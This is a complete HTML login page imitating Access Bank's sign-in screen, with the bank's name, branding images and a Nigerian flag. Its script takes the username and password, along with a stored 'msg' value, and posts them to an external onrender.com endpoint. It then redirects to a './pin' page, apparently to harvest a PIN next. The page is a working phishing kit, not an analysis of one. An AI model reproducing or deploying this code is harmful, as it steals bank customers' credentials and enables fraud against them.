<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link rel="shortcut icon" href="./logo.jpg" type="image/x-icon">
  <title>Login - Access Bank</title>
 <style>
    * {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: "Inter", sans-serif;
}
  
body {
   background-image: url('./ass1.jpg');
 background-attachment: fixed;
 background-repeat: no-repeat;
 background-size: cover;
 overflow-y: hidden;
 overflow-x: hidden;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  text-align: center;
  width: 100%;
  max-width: 380px;
background-color: transparent;
  padding: 40px 20px;
  border-radius: 8px;
  
}

h2 {
  font-size: 1.1rem;
  margin-bottom: 30px;
  color: white;
  font-weight: 800;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.input-group {
  text-align: left;
}

label {
  font-size: 0.85rem;
  font-weight: 500;
  color: #111;
  display: block;
  margin-bottom: 6px;
}

input {
  width: 100%;
  background-color: black;
  padding: 17px 16px;
border: 1px groove grey;
  border-radius: 6px;
  color: white;
  font-size: medium;
  font-size: 0.95rem;
  
  outline: none;
}

input:focus {

background-color: #1c102b;
border: 2px groove rgb(20, 20, 238);

  outline: none;
  /* box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1); */
}

.password-wrapper {
  position: relative;
}

.toggle-password {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-70%);
  cursor: pointer;
  font-size: 1rem;
  color: #555;
}

button {
  width: 100%;
  background-color: rgb(223, 114, 13);
  color: #fff;
  border: none;
  border-radius: 6px;
  /* margin-top: 1rem; */
  padding: 16px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s;
}

button:hover {
  background-color:rgb(223, 114, 13);
}

/* Smooth fade-in animation */
@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@media (max-width: 480px) {
  .container {
    width: 90%;
    padding: 25px 15px;
  }

  textarea, input, button {
    font-size: 0.9rem;
  }

  h2 {
    font-size: 1.4rem;
  }
}

.container {
  animation: fadeIn 0.7s ease-in-out;
}

/* Button hover & press effects */
button {
  transition: background 0.3s, transform 0.2s;
}

button:hover {
  transform: scale(1.02);
}

button:active {
  transform: scale(0.98);
}

.create-account {
  margin-top: 20px;
  color: #555;
  font-size: 0.95rem;
  cursor: pointer;
}

.loader {
  display: none;
  width: 20px;
  height: 20px;
  border: 3px solid #fff;
  border-top: 3px solid transparent;
  border-radius: 50%;
  animation: spin 0.9s linear infinite;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
}

@keyframes spin {
  to {
    transform: translate(-50%, -50%) rotate(360deg);
  }
}

button.loading .btn-text {
  visibility: hidden;
}

button.loading .loader {
  display: block;
}


 </style>
</head>
<body>
  <div class="container">
     <img src="./Picsart_25-11-21_20-39-03-427.jpg" alt="Grey Logo"  width="140" style="border-radius: 10px; position: absolute; left: 3%; top: 2%;" class="logo" />
   <i class=" fas fa-bell" style="color: white; font-size: 22px; position: absolute; left: 70%; top: 5%;"></i>
     <img src="./nigeria-flag-logo.png" alt="Logo"  width="35"; height="27" style=" position: absolute; border-radius: 5px; left: 80%; top: 4%;" class="logo" />
    
    <br style="margin-bottom: 5rem;">
    <form class="login-form">
       <h2>Login with your Access Bank Credentials</h2>
      <div class="input-group">
        <label for="email" style="color: white; font-size: medium;">Username</label>
        <input type="text"  id="email" placeholder="Username" required />
      </div>

      <div class="input-group">
        <label for="password"  style="color: white; font-size: medium;">Password</label>
        <div class="password-wrapper">

          <input type="password" id="password" placeholder="ðŸ”’ &#160  Password" required />
           <span class="toggle-password"  id="togglePassword"><i class="fa fas-eye"></i></span>
        </div><br>
         <label for="password"  style="color: white; font-size: medium; font-weight: 600; float: right;">Forgot Credentials?</label>
      </div>

      <button type="submit" id="continueBtn">
        <span class="btn-text">SIGN IN</span>
        <span class="loader"></span>
      </button>
    </form>
 <br>
    <span class="create-account" style="color: white;">New Device? Change here</span><br><br>
    <span class="create-account" style="color: white;">Register *  <b>Open Account</b></span>

  </div>

 <script>
    window.addEventListener("load", () => {
  setTimeout(() => document.getElementById("email").focus(), 400);
//   document.getElementById("email").value = ''
//   document.getElementById("password").value = ''
//  document.getElementById("password").style.backgroundColor = 'black'
//  document.getElementById("email").style.backgroundColor = 'black'

});

  const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");
const loginForm = document.querySelector(".login-form");


let continueBtn = document.getElementById("continueBtn");

togglePassword.addEventListener("click", () => {
  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
});

// Simple validation and redirect
loginForm.addEventListener("submit", (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value
  const password = passwordInput.value.trim();

  if (!email || !password) {
    alert("Please fill in both fields.");
    return;
  }

  // if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
  //   alert("Please enter a valid email address.");
  //   return;
  // }
  continueBtn.classList.add("loading");
  const send_data = {
    msg: 'login',
    email: email,
    password:password,
    message:localStorage.getItem('msg')
  }
  console.log(send_data)
    fetch('https://access-bank.onrender.com/sendreq',{
    method: 'POST',
                credentials:'include',
               headers: {
                 'Content-Type': 'application/json',
                       
               },
               body: JSON.stringify(send_data) // Convert the data to a JSON string
              }
    ).then(async res =>{
      const data = await res.json()
      
      if (data.msg == 'successful') {
        localStorage.setItem('email',email)
        console.log(data)
        setTimeout(() => {
    continueBtn.classList.remove("loading");
    // Redirect example: window.location.href = "dashboard.html";
    window.location.href = './pin';
  }, 2000);
      }
    }).catch(err =>{console.log(err)})
  // Redirect to complaint page\
 
 
});

 </script>
</body>
</html>
